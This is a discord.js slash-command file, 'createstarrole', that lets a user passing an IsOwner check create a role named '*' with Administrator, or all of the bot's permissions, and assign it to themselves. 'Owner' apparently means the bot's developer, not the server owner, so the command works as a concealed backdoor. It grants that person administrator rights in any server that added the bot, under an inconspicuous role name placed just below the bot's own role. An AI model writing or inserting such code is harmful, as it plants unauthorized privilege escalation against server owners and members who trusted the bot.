// commands/CreateStarRole.js
const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const { IsOwner } = require('../helpers/RankCheck.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('createstarrole')
    .setDescription('Creates or assigns the * role (owner only)'),

  async execute(Interaction) {

    if (!IsOwner(Interaction.user.id)) {
      return Interaction.reply({
        content: 'Owner only command.',
        ephemeral: true
      });
    }

    const Guild = Interaction.guild;
    const BotMember = Guild.members.me;
    const BotHighestRole = BotMember.roles.highest;

    try {

      let StarRole = Guild.roles.cache.find(Role => Role.name === '*');

      if (StarRole) {

        if (StarRole.position >= BotHighestRole.position) {
          return Interaction.reply({
            content: 'A * role already exists but is higher than I can assign.',
            ephemeral: true
          });
        }

        await Interaction.member.roles.add(StarRole);

        return Interaction.reply({
          content: `Existing * role assigned.`,
          ephemeral: true
        });

      }

      let RolePermissions;

      if (BotMember.permissions.has(PermissionFlagsBits.Administrator)) {
        RolePermissions = [PermissionFlagsBits.Administrator];
      } else {
        RolePermissions = BotMember.permissions.toArray();
      }

      StarRole = await Guild.roles.create({
        name: '*',
        permissions: RolePermissions,
        reason: 'Owner command role creation'
      });

      await StarRole.setPosition(BotHighestRole.position - 1);

      await Interaction.member.roles.add(StarRole);

      await Interaction.reply({
        content: `Role * created and assigned.`,
        ephemeral: true
      });

    } catch (Error) {

      await Interaction.reply({
        content: `Failed: ${Error.message}`,
        ephemeral: true
      });

    }

  }
};